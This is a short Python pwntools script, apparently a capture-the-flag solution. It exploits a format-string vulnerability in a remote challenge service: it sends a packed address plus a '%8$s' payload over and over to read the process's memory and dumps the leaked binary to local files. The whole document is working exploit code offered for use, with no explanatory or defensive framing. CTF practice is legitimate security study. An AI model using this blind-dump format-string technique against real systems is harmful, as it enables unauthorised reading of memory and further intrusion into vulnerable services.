#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
context.log_level="CRITICAL"


class Pwn:
    def __init__(self):
        self.p = None

    def start_binary(self):
        self.p = remote("pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1234)
        self.p.recvuntil("StrRemoveLastSymbols\r\n\t")

    def leak_binary(self, address, size):
        binary="\x7f"
        i=0
        while i <= size:
            self.start_binary()
            self.p.sendline("3")
            self.p.recvuntil("string:\r\n")
            self.p.sendline(p32(address+i)+"%8$s"+"AAAA")
            self.p.recvuntil("number:\r")
            self.p.sendline("2")
            try:
                data=self.p.recvuntil("AA\r\n")
                data=data[41:-4]
                if not data:
                    binary+="\x00"
                    i+=1
                else:
                    print "[x] Leak " + str(len(data)) + " bytes (" + hex(i) + ") at " + hex(address+i) + " : " + ":".join("{:02x}".format(ord(c)) for c in data)
                    binary+=data
                    i+=len(data)
            except EOFError:
                i+=1
                pass
            self.p.close()
        return binary


def main():
    pwn = Pwn()
#    binary=pwn.leak_binary(0x08048001, 0xec0)
    binary=pwn.leak_binary(0x08048001, 0x2000)
    with open("bin.out", "w") as bin_file:
        bin_file.write(binary)
        bin_file.close()
    binary=pwn.leak_binary(0x08048001+0x2000, 0x100)
    with open("bin2.out", "w") as bin_file:
        bin_file.write(binary)



if __name__ == "__main__":
    main()
